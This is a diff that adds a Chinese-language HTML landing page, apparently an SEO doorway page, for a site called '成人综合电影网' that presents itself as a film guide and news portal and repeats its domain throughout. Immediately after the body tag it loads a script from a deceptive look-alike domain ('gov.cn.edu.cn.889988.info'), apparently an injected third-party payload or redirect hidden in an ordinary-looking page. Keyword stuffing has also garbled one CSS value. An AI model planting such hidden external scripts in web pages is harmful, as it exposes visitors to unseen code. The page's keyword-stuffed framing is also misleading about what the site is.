@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>成人综合电影网｜在线电影资源导航与影视资讯分享平台</title>
+<meta name="keywords" content="成人综合电影网,chengrenzonghedianyingwang-app.github.io,综合电影网,在线电影,电影导航,影视资源,电影资讯,免费电影网站">
+<meta name="description" content="成人综合电影网（https://chengrenzonghedianyingwang-app.github.io）是一个面向影迷的影视资源聚合与导航平台，涵盖热门电影推荐、影视资讯速递、经典影片回顾和观影指南四大核心板块，每日更新内容，帮助观众快速找到想看的影片。">
+<meta name="subject" content="影视资源导航与电影资讯">
+<meta name="classification" content="娱乐,电影">
+<meta name="author" content="成人综合电影网">
+<meta name="copyright" content="Copyright © 成人综合电影网 All Rights Reserved">
+<meta name="robots" content="index,follow">
+<meta name="googlebot" content="index,follow">
+<meta name="bingbot" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+<meta name="referrer" content="no-referrer-when-downgrade">
+<meta name="theme-color" content="#0d0f1a">
+<meta property="og:type" content="website">
+<meta property="og:title" content="成人综合电影网 - 影视资源导航与电影资讯平台">
+<meta property="og:description" content="成人综合电影网 chengrenzonghedianyingwang-app.github.io 提供热门电影推荐、影视资讯、经典影片与观影指南。">
+<meta property="og:url" content="https://chengrenzonghedianyingwang-app.github.io">
+<meta property="og:site_name" content="成人综合电影网">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="成人综合电影网">
+<meta name="twitter:description" content="影视资源导航与电影资讯分享平台">
+<link rel="canonical" href="https://chengrenzonghedianyingwang-app.github.io">
+<link rel="alternate" hreflang="zh-CN" href="https://chengrenzonghedianyingwang-app.github.io">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0d0f1a;--bg2:#141728;--card:#1a1e33;--line:#2a2f48;
+  --txt:#e8eaf2;--sub:#9aa0bf;--gold:#f5c542;--cyan:#38d6e8;--pink:#ff5f8a;
+  --r:14px;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  background:var(--bg);color:var(--txt);line-height:1.75;overflow-x:hidden;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:-2;
+  background:radial-gradient(1200px 700px at 15% -10%,rgba(245,197,66,.10),transparent 60%),
+             radial-gradient(1000px 600px at 90% 10%,rgba(56,214,232,.09),transparent 60%),
+             radial-gradient(900px 700px at 50% 110%,rgba(255,95,138,.08),transparent 60%);
+}
+body::after{
+  content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.035;
+  background-image:linear-gradient(rgba(255,255,255,.5) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.5) 1px,transparent 1px);
+  background-size:44px 44px;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.wrap{max-width:1120px;margin:0 auto;padding:0 18px}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:11px 22px;border-radius:999px;
+  font-size:14px;font-weight:600;cursor:pointer;border:1px solid transparent;transition:.25s}
+.btn-gold{background:linear-gradient(135deg,var(--gold),#e0a52f);color:#1a1408;box-shadow:0 8px 22px -8px rgba(245,197,66,.7)}
+.btn-gold:hover{transform:translateY(-2px);box-shadow:0 12px 28px -8px rgba(245,197,66,.85)}
+.btn-ghost{background:transparent;color:var(--txt);border-color:var(--line)}
+.btn-ghost:hover{border-color:var(--cyan);color:var(--cyan)}
+
+/* Header */
+.hd{position:sticky;top:0;z-index:50;background:rgba(13,15,26,.86);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.hd-in{display:flex;align-items:center;justify-content:space-between;height:62px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:800;font-size:19px;letter-spacing:.3px}
+.logo-mark{width:34px;height:34px;border-radius:9px;display:grid;place-items:center;font-size:15px;font-weight:900;
+  background:linear-gradient(135deg,var(--gold),var(--pink));color:#141210;
+  box-shadow:0 6px 18px -6px rgba(245,197,66,.6)}
+.logo em{font-style:normal;color:var(--gold)}
+.nav{display:flex;align-items:center;gap:6px}
+.nav a{font-size:14.5px;padding:7px 12px;border-radius:9px;color:var(--sub);transition:.2s;white-space:nowrap}
+.nav a:hover{color:var(--txt);background:rgba(255,255,255,.05)}
+.hd-act{display:flex;align-items:center;gap:10px}
+.menu-btn{display:none;width:40px;height:40px;border:1px solid var(--line);border-radius:10px;background:transparent;color:var(--txt);font-size:20px;cursor:pointer}
+
+/* Hero */
+.hero{padding:70px 0 54px;position:relative}
+.tag-row{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:20px}
+.tag{font-size:12px;padding:5px 12px;border-radius:999px;background:rgba(56,214,232,.1);color:var(--cyan);border:1px solid rgba(56,214,232,.25)}
+.tag:nth-child(2){background:rgba(245,197,66,.1);color:var(--gold);border-color:rgba(245,197,66,.25)}
+.tag:nth-child(3){background:rgba(255,95,138,.1);color:var(--pink);border-color:rgba(255,95,138,.25)}
+.hero h1{font-size:clamp(30px,5.4vw,52px);line-height:1.22;font-weight:900;letter-spacing:-.5px;margin-bottom:8px}
+.hero h1 .hl{background:linear-gradient(100deg,var(--gold),var(--pink));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero .sub{font-size:clamp(16px,2.4vw,21px);color:var(--gold);font-weight:700;margin-bottom:18px}
+.hero p.lead{color:var(--sub);max-width:640px;font-size:15.5px}
+.hero-act{display:flex;flex-wrap:wrap;gap:12px;margin-top:28px}
+.hero-meta{margin-top:34px;display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.mcard{padding:16px;border-radius:var(--r);background:linear-gradient(160deg,var(--card),rgba(26,30,51,.4));border:1px solid var(--line)}
+.mcard b{display:block;font-size:24px;font-weight:800;color:var(--gold)}
+.mcard span{font-size:12.5px;color:var(--sub)}
+
+/* Section */
+section{padding:56px 0}
+.sec-h{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:30px;flex-wrap:wrap}
+.sec-h .t{font-size:clamp(22px,3.4vw,32px);font-weight:800;letter-spacing:-.3px}
+.sec-h .t small{display:block;font-size:12.5px;color:var(--sub);font-weight:500;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px}
+.sec-h .more{font-size:13.5px;color:var(--cyan);white-space:nowrap}
+.sec-h .more:hover{text-decoration:underline}
+
+/* Grid */
+.grid{display:grid;gap:18px}
+.g4{grid-template-columns:repeat(4,1fr)}
+.g3{grid-template-columns:repeat(3,1fr)}
+.g2{grid-template-columns:repeat(2,1fr)}
+
+.post{background:var(--card);border:1px solid var(--line);border-radius:var(--r);overflow:hidden;transition:.28s;display:flex;flex-direction:column}
+.post:hover{transform:translateY(-5px);border-color:rgba(245,197,66,.45);box-shadow:0 18px 40px -22px rgba(0,0,0,.8)}
+.thumb{position:relative;aspect-ratio:16/10;overflow:hidden}
+.thumb .ph{position:absolute;inset:0;display:grid;place-items:center;font-size:34px;font-weight:900;color:rgba(255,255,255,.8)}
+.thumb .ph::after{content:"";position:absolute;inset:0;background:linear-gradient(160deg,transparent 30%,rgba(0,0,0,.55))}
+.badge{position:absolute;top:10px;left:10px;z-index:2;font-size:11px;padding:4px 9px;border-radius:6px;background:rgba(0,0,0,.6);backdrop-filter:blur(4px);font-weight:600}
+.badge.g{background:var(--gold);color:#1a1408}
+.score{position:absolute;right:10px;bottom:10px;z-index:2;font-size:12px;font-weight:800;padding:4px 9px;border-radius:7px;background:rgba(13,15,26,.85);border:1px solid var(--gold);color:var(--gold)}
+.post .body{padding:16px;flex:1;display:flex;flex-direction:column}
+.post h3{font-size:16.5px;font-weight:700;line-height:1.5;margin-bottom:8px}
+.post .desc{font-size:13.5px;color:var(--sub);flex:1}
+.post .ft{margin-top:14px;padding-top:12px;border-top:1px dashed var(--line);display:flex;justify-content:space-between;font-size:12px;color:var(--sub)}
+
+/* News list */
+.news{border:1px solid var(--line);border-radius:var(--r);background:var(--card);overflow:hidden}
+.news li{list-style:none;display:flex;gap:14px;align-items:flex-start;padding:16px 18px;border-bottom:1px solid var(--line)}
+.news li:last-child{border-bottom:none}
+.news .n{font-size:12px;font-weight:800;color:var(--gold);min-width:52px;padding-top:3px}
+.news .n i{font-style:normal;display:block;color:var(--sub);font-weight:500;font-size:11px}
+.news h4{font-size:15px;font-weight:600;flex:1}
+.news h4:hover{color:var(--gold)}
+.news .arrow{color:var(--sub);font-size:18px;padding-top:2px}
+
+/* schedule */
+.sch{display:grid;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:var(--r);overflow:hidden}
+.sch-row{display:grid;grid-template-columns:成人px 1fr 90px;background:var(--card);align-items:center}
+.sch-row.head{background:linear-gradient(100deg,var(--bg2),var(--card))}
+.sch-row.head div{font-size:12px;color:var(--sub);font-weight:700;letter-spacing:1px}
+.sch-row div{padding:13px 16px;font-size:14px}
+.sch-row .tm{font-weight:800;color:var(--gold);font-size:14px}
+.sch-row .lk{text-align:right;font-size:13px;color:var(--cyan)}
+
+/* CTA */
+.cta{text-align:center;padding:66px 22px;border-radius:20px;border:1px solid var(--line);
+  background:radial-gradient(700px 300px at 50% 0%,rgba(245,197,66,.13),transparent 70%),var(--card)}
+.cta h2{font-size:clamp(23px,3.6vw,34px);font-weight:900;margin-bottom:12px}
+.cta p{color:var(--sub);max-width:560px;margin:0 auto 26px}
+.url-box{display:inline-flex;align-items:center;gap:10px;padding:11px 18px;border-radius:10px;background:rgba(0,0,0,.35);border:1px solid var(--line);font-size:13.5px;color:var(--gold);font-family:"SF Mono",Consolas,monospace;margin-bottom:24px}
+
+/* Footer */
+.ft-wrap{padding:54px 0 26px;border-top:1px solid var(--line);margin-top:30px}
+.ft-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:32px;margin-bottom:34px}
+.ft-grid h5{font-size:13px;color:var(--gold);letter-spacing:2px;text-transform:uppercase;margin-bottom:14px}
+.ft-grid ul{list-style:none;display:grid;gap:9px}
+.ft-grid a{font-size:13.5px;color:var(--sub)}
+.ft-grid a:hover{color:var(--txt)}
+.ft-b{padding-top:22px;border-top:1px solid var(--line);display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;font-size:12.5px;color:var(--sub)}
+.ft-b .kw{font-family:"SF Mono",Consolas,monospace;color:var(--gold)}
+
+/* responsive */
+@media(max-width:960px){
+  .g4,.g3{grid-template-columns:repeat(2,1fr)}
+  .hero-meta{grid-template-columns:repeat(2,1fr)}
+  .ft-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:680px){
+  .wrap{padding:0 14px}
+  section{padding:42px 0}
+  .menu-btn{display:grid;place-items:center}
+  .nav{position:fixed;top:62px;left:0;right:0;flex-direction:column;align-items:stretch;gap:2px;padding:14px;
+    background:rgba(13,15,26,.98);border-bottom:1px solid var(--line);transform:translateY(-120%);transition:.3s;visibility:hidden}
+  .nav.open{transform:translateY(0);visibility:visible}
+  .nav a{padding:13px 14px;font-size:15px;border-radius:8px}
+  .hd-act .btn-ghost{display:none}
+  .g4,.g3,.g2{grid-template-columns:1fr}
+  .hero{padding:44px 0 34px}
+  .hero-act .btn{flex:1;justify-content:center}
+  .sch-row{grid-template-columns:70px 1fr}
+  .sch-row .lk{display:none}
+  .news li{flex-direction:column;gap:6px}
+  .ft-grid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header class="hd">
+  <div class="wrap hd-in">
+    <a href="#" class="logo"><span class="logo-mark">成人</span>成人综合<em>电影网</em></a>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#recommend">热门推荐</a>
+      <a href="#news">影视资讯</a>
+      <a href="#classic">经典回顾</a>
+      <a href="#guide">观影指南</a>
+      <a href="#schedule">更新排期</a>
+    </nav>
+    <div class="hd-act">
+      <a href="https://chengrenzonghedianyingwang-app.github.io" class="btn btn-ghost">访问官网</a>
+      <button class="menu-btn" id="mbtn" aria-label="菜单">☰</button>
+    </div>
+  </div>
+</header>
+
+<main>
+  <!-- HERO -->
+  <section class="hero" id="home">
+    <div class="wrap">
+      <div class="tag-row">
+        <span class="tag">每日更新</span>
+        <span class="tag">海量片库</span>
+        <span class="tag">精选推荐</span>
+      </div>
+      <h1>一站式<span class="hl">影视导航</span><br>发现好片，从这里开始</h1>
+      <p class="sub">成人综合电影网 · chengrenzonghedianyingwang-app.github.io</p>
+      <p class="lead">成人综合电影网专注于为影迷提供优质的电影资源导航与影视资讯服务。我们每日精选院线热片、口碑佳作与经典老片，配以专业的影片解读与观影指南，让你在海量内容中快速锁定值得一看的作品。</p>
+      <div class="hero-act">
+        <a href="#recommend" class="btn btn-gold">浏览热门推荐 →</a>
+        <a href="#guide" class="btn btn-ghost">查看观影指南</a>
+      </div>
+      <div class="hero-meta">
+        <div class="mcard"><b>6</b><span>大内容栏目</span></div>
+        <div class="mcard"><b>1200+</b><span>精选影片收录</span></div>
+        <div class="mcard"><b>每日</b><span>资讯更新频次</span></div>
+        <div class="mcard"><b>10年</b><span>经典影片跨度</span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- RECOMMEND -->
+  <section id="recommend">
+    <div class="wrap">
+      <div class="sec-h">
+        <div class="t"><small>Hot Picks</small>热门推荐 · 本周必看</div>
+        <a href="#" class="more">查看全部推荐 →</a>
+      </div>
+      <div class="grid g4">
+        <article class="post">
+          <div class="thumb"><div class="ph" style="background:linear-gradient(135deg,#2b1055,#7597de)">破晓行动</div><span class="badge g">热映</span><span class="score">9.1</span></div>
+          <div class="body">
+            <h3>《破晓行动》——年度动作大片震撼上映</h3>
+            <p class="desc">国际刑警跨境追凶，108分钟全程高能，实拍爆炸场面堪称近年最强。</p>
+            <div class="ft"><span>动作 / 犯罪</span><span>2026 · 128min</span></div>
+          </div>
+        </article>
+        <article class="post">
+          <div class="thumb"><div class="ph" style="background:linear-gradient(135deg,#134e5e,#71b280)">云端恋人</div><span class="badge">口碑</span><span class="score">8.7</span></div>
+          <div class="body">
+            <h3>《云端恋人》——一部写给数字时代的爱情童话</h3>
+            <p class="desc">当AI拥有了心跳，两个孤独灵魂在虚拟与现实之间寻找答案。</p>
+            <div class="ft"><span>爱情 / 科幻</span><span>2026 · 112min</span></div>
+          </div>
+        </article>
+        <article class="post">
+          <div class="thumb"><div class="ph" style="background:linear-gradient(135deg,#42275a,#734b6d)">深海回声</div><span class="badge">悬疑</span><span class="score">8.9</span></div>
+          <div class="body">
+            <h3>《深海回声》——密闭空间里的心理博弈</h3>
+            <p class="desc">海底实验室突发失联，六名科学家被困，真相远比想象更可怕。</p>
+            <div class="ft"><span>悬疑 / 惊悚</span><span>2026 · 105min</span></div>
+          </div>
+        </article>
+        <article class="post">
+          <div class="thumb"><div class="ph" style="background:linear-gradient(135deg,#f7971e,#ffd200)">长安少年</div><span class="badge g">国风</span><span class="score">9.3</span></div>
+          <div class="body">
+            <h3>《长安少年》——盛唐气象下的江湖豪情</h3>
+            <p class="desc">一幅会动的《长安十二时辰》画卷，美术与武打双双封神。</p>
+            <div class="ft"><span>古装 / 武侠</span><span>2026 · 136min</span></div>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- NEWS -->
+  <section id="news">
+    <div class="wrap">
+      <div class="sec-h">
+        <div class="t"><small>Film News</small>影视资讯速递</div>
+        <a href="#" class="more">更多资讯 →</a>
+      </div>
+      <ul class="news">
+        <li><div class="n">10-12<i>行业</i></div><h4>2026年国庆档票房突破75亿，三部影片跻身年度前十</h4><span class="arrow">›</span></li>
+        <li><div class="n">10-11<i>口碑</i></div><h4>《长安少年》豆瓣开分8.9，成今年评分最高国产古装片</h4><span class="arrow">›</span></li>
+        <li><div class="n">10-10<i>预告</i></div><h4>年末压轴科幻巨制《星海孤舟》发布终极预告，定档12月</h4><span class="arrow">›</span></li>
+        <li><div class="n">10-09<i>访谈</i></div><h4>导演专访：我们如何用实拍完成《破晓行动》全部爆炸戏</h4><span class="arrow">›</span></li>
+        <li><div class="n">10-08<i>盘点</i></div><h4>十月值得期待的十部新片，这份观影清单请收好</h4><span class="arrow">›</span></li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- CLASSIC -->
+  <section id="classic">
+    <div class="wrap">
+      <div class="sec-h">
+        <div class="t"><small>Classic Rewind</small>经典回顾 · 百看不厌</div>
+        <a href="#" class="more">经典片单 →</a>
+      </div>
+      <div class="grid g3">
+        <article class="post">
+          <div class="thumb"><div class="ph" style="background:linear-gradient(135deg,#232526,#414345)">肖申克的救赎</div><span class="badge g">影史TOP</span></div>
+          <div class="body">
+            <h3>希望是件美好的事，也许是最好的事</h3>
+            <p class="desc">1994年弗兰克·德拉邦特执导，蒂姆·罗宾斯与摩根·弗里曼主演，关于自由、友谊与坚持的永恒经典。</p>
+            <div class="ft"><span>剧情</span><span>豆瓣 9.7</span></div>
+          </div>
+        </article>
+        <article class="post">
+          <div class="thumb"><div class="ph" style="background:linear-gradient(135deg,#3a1c71,#d76d77)">阿甘正传</div><span class="badge">励志</span></div>
+          <div class="body">
+            <h3>Life was like a box of chocolates</h3>
+            <p class="desc">奔跑改变命运。汤姆·汉克斯用最纯粹的表演，讲完了美国三十年的变迁史。</p>
+            <div class="ft"><span>剧情 / 爱情</span><span>豆瓣 9.5</span></div>
+          </div>
+        </article>
+        <article class="post">
+          <div class="thumb"><div class="ph" style="background:linear-gradient(135deg,#0f2027,#203a43)">星际穿越</div><span class="badge">科幻</span></div>
+          <div class="body">
+            <h3>爱是唯一可以超越时间与空间的事物</h3>
+            <p class="desc">诺兰以硬核物理学为骨架，包裹着浓烈父女情，视听与情感双重震撼。</p>
+            <div class="ft"><span>科幻 / 冒险</span><span>豆瓣 9.4</span></div>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- GUIDE -->
+  <section id="guide">
+    <div class="wrap">
+      <div class="sec-h">
+        <div class="t"><small>Watching Guide</small>观影指南 · 选片不再纠结</div>
+        <a href="#" class="more">完整指南 →</a>
+      </div>
+      <div class="grid g2">
+        <article class="post">
+          <div class="thumb"><div class="ph" style="background:linear-gradient(135deg,#11998e,#38ef7d)">按心情选片</div></article>
+          <div class="body">
+            <h3>心情不好时，该看什么？</h3>
+            <p class="desc">我们整理了「治愈系」「燃向提气」「轻松爆米花」「睡前助眠」四类片单，三秒匹配当下情绪。</p>
+            <div class="ft"><span>4类片单</span><a href="#">开始匹配 →</a></div>
+          </div>
+        </article>
+        <article class="post">
+          <div class="thumb"><div class="ph" style="background:linear-gradient(135deg,#fc4a1a,#f7b733)">新手上路</div></article>
+          <div class="body">
+            <h3>从零开始的观影进阶路线</h3>
+            <p class="desc">20部入门必看 + 30部进阶佳作 + 大师专题，循序渐进建立属于你自己的观影体系。</p>
+            <div class="ft"><span>50部精选</span><a href="#">查看路线 →</a></div>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- SCHEDULE -->
+  <section id="schedule">
+    <div class="wrap">
+      <div class="sec-h">
+        <div class="t"><small>Weekly Schedule</small>本周更新排期</div>
+        <a href="#" class="more">订阅更新 →</a>
+      </div>
+      <div class="sch">
+        <div class="sch-row head"><div>时间</div><div>内容安排</div><div>栏目</div></div>
+        <div class="sch-row"><div class="tm">周一</div><div>院线新片口碑速评</div><div class="lk">热门推荐</div></div>
+        <div class="sch-row"><div class="tm">周二</div><div>导演专题与幕后故事</div><div class="lk">影视资讯</div></div>
+        <div class="sch-row"><div class="tm">周三</div><div>高分冷门片挖掘</div><div class="lk">观影指南</div></div>
+        <div class="sch-row"><div class="tm">周四</div><div>经典影片深度解读</div><div class="lk">经典回顾</div></div>
+        <div class="sch-row"><div class="tm">周五</div><div>周末观影清单推荐</div><div class="lk">热门推荐</div></div>
+        <div class="sch-row"><div class="tm">周日</div><div>本周影视行业大盘点</div><div class="lk">影视资讯</div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- CTA -->
+  <section>
+    <div class="wrap">
+      <div class="cta">
+        <h2>收藏 成人综合电影网，从此告别片荒</h2>
+        <p>每天花三分钟，看看我们为你挑好的那一部。影视资源导航、电影资讯、经典回顾与观影指南，一站搞定。</p>
+        <div class="url-box">🔗 https://chengrenzonghedianyingwang-app.github.io</div>
+        <div><a href="https://chengrenzonghedianyingwang-app.github.io" class="btn btn-gold">立即访问官网 →</a></div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="ft-wrap">
+  <div class="wrap">
+    <div class="ft-grid">
+      <div>
+        <a href="#" class="logo" style="margin-bottom:14px"><span class="logo-mark">成人</span>成人综合<em>电影网</em></a>
+        <p style="font-size:13.5px;color:var(--sub);margin-top:14px">一个专注影视资源导航与电影资讯分享的平台，帮你更快找到值得看的好片。</p>
+      </div>
+      <div>
+        <h5>内容栏目</h5>
+        <ul>
+          <li><a href="#recommend">热门推荐</a></li>
+          <li><a href="#classic">经典回顾</a></li>
+          <li><a href="#guide">观影指南</a></li>
+          <li><a href="#schedule">更新排期</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>影片分类</h5>
+        <ul>
+          <li><a href="#">动作犯罪</a></li>
+          <li><a href="#">爱情喜剧</a></li>
+          <li><a href="#">科幻悬疑</a></li>
+          <li><a href="#">古装武侠</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>关于本站</h5>
+        <ul>
+          <li><a href="#">网站简介</a></li>
+          <li><a href="#">联系方式</a></li>
+          <li><a href="#">免责声明</a></li>
+          <li><a href="#">友情链接</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="ft-b">
+      <span>Copyright © 2026 成人综合电影网 保留所有权利 · 本站域名：<span class="kw">chengrenzonghedianyingwang-app.github.io</span></span>
+      <span>官方网址：<span class="kw">https://chengrenzonghedianyingwang-app.github.io</span></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var btn=document.getElementById('mbtn'),nav=document.getElementById('nav');
+  if(btn&&nav){
+    btn.addEventListener('click',function(){nav.classList.toggle('open')});
+    nav.addEventListener('click',function(e){if(e.target.tagName==='A')nav.classList.remove('open')});
+  }
+  document.addEventListener('scroll',function(){
+    var hd=document.querySelector('.hd');
+    if(window.scrollY>20){hd.style.boxShadow='0 8px 30px -12px rgba(0,0,0,.6)';}
+    else{hd.style.boxShadow='none';}
+  },{passive:true});
+})();
+</script>
+</body>
+</html>
